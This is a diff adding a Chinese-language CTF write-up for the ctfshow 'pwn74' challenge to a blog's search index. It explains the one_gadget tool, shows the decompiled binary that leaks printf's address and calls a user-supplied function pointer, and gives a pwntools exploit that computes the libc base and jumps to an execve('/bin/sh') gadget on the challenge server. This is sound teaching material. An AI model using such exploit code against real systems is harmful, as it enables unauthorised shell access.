@@ -765,4 +765,58 @@
         <tag>CTF - PWN - 网络安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>ctfshow pwn入门 pwn74</title>
+    <url>/2025/11/29/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn74/</url>
+    <content><![CDATA[<h2 id="pwn74"><a href="#pwn74" class="headerlink" title="pwn74"></a>pwn74</h2><p><a href="https://ctf.show/challenges#pwn74-4084">ctf.show pwn74</a></p>
+<span id="more"></span>
+
+<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ul>
+<li><a href="#jump1">题目</a></li>
+<li><a href="#jump2">预计时间</a></li>
+<li><a href="#jump3">题目分析及截图</a></li>
+</ul>
+<hr>
+<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a><a id='jump1'>题目</a></h4><img src="/2025/11/29/ctfshow-pwn%E5%85%A5%E9%97%A8-pwn74/1.png" class="" title="This is an image">
+
+<h4 id="预计时间"><a href="#预计时间" class="headerlink" title="预计时间"></a><a id='jump2'>预计时间</a></h4><p>2h</p>
+<h4 id="题目分析及截图"><a href="#题目分析及截图" class="headerlink" title="题目分析及截图"></a><a id='jump3'>题目分析及截图</a></h4><p><strong>one_gadget：</strong></p>
+<p>​	开始解题之前，我们需要知道 <strong>one_gadget</strong> 是什么工具，它的作用是什么，我们什么时候用？</p>
+<ul>
+<li><strong>one_gadget</strong> 是一个用于扫描 <strong>libc文件</strong> ，找到可以执行<code>execve(&quot;/bin/sh&quot;，null,null)</code>的gadget地址的工具</li>
+<li>它的作用就是帮助我们直接拿到一个可能出shell的地址，而不必手动构造完整ROP链。</li>
+<li>当我们知道本题的libc版本，或者题目给我们了libc版本，那么我们就可以使用这个工具，如果这些<code>execvee(&quot;/bin/sh&quot;,null,null)</code>的其中一个的前提条件都满足，我们就可以使用这个地址</li>
+</ul>
+<p><strong>安装方式：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt -y install ruby</span><br><span class="line"><span class="built_in">sudo</span> gem install one_gadget</span><br></pre></td></tr></table></figure>
+
+<p><strong>使用方式：</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>接下来我们看这道题怎么解</p>
+<p>使用ida看函数的反编译代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4[<span class="number">2</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;    鈻勨杽鈻勨杽   鈻勨杽鈻勨杽鈻勨杽鈻勨杽  鈻勨杽鈻勨杽鈻勨杽鈻勨杽            鈻勨杽                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A80);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot; 鈻堚枅鈻€          鈻堚枅     鈻堚枅        鈻勨杽鈻堚枅鈻堚枅鈻堚杽  鈻堚枅鈻勨枅鈻堚枅鈻堚杽   鈻勨枅鈻堚枅鈻堚杽  鈻堚枅      鈻堚枅&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CA8);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;    鈻€鈻€鈻€鈻€      鈻€鈻€     鈻€鈻€         鈻€鈻€鈻€鈻€鈻€鈻€   鈻€鈻€    鈻€鈻€    鈻€鈻€鈻€鈻€     鈻€鈻€  鈻€鈻€  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : PWN_Tricks                                              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Use one_gadget a shuttle!                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this:%p ?\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, v4);</span><br><span class="line">  v4[<span class="number">1</span>] = v4[<span class="number">0</span>];</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v4[<span class="number">0</span>])();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在<code> printf(&quot;What&#39;s this:%p ?\n&quot;, &amp;printf);</code>中程序会输出<code>printf</code>的地址</li>
+</ul>
+<p>​	使用用户输入来获取函数指针，并通过函数指针调用相应的函数。需要注意的是，这种通过用户输入来获取函数指针并调用函数的做法极有可能会带来安全隐患，因为恶意用户可以输入不安全的函数指针，导致程序出现问题。</p>
+<p>​	我们使用<code> one_gadget</code>来看看我们有没有可以用的<code>execve(&quot;/bin/sh&quot;)</code>调用</p>
+<p>​	因为使用libc是需要和题目一致的，我的虚拟机并不是使用的附带的虚拟机，我就只下载了libc文件放在了和程序一样的目录下，然后使用<code>one_gadget ./libc.so.6</code>就可以看到程序有哪些可以用的gadget地址，或者你也可以自己泄露，因为这里我也是猜的，没有什么依据。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yyh@yyh:~/pwn74$ one_gadget ./libc.so.6</span><br><span class="line">0x4f29e execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x50 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, <span class="string">&quot;-c&quot;</span>, r12, NULL&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x4f2a5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  address rsp+0x50 is writable</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL || &#123;rcx, rax, r12, NULL&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x4f302 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL || &#123;[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0x10a2fc execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span><br></pre></td></tr></table></figure>
+
+<p>一个一个去试这些地址</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28159</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a2fc</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;this:&#x27;</span>)</span><br><span class="line">print_libc = libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base = (printf - print_libc)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(one_gadget+base))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>即可得到flag</p>
+<p>​	</p>
+]]></content>
+      <tags>
+        <tag>CTF - PWN - 网络安全</tag>
+      </tags>
+  </entry>
 </search>
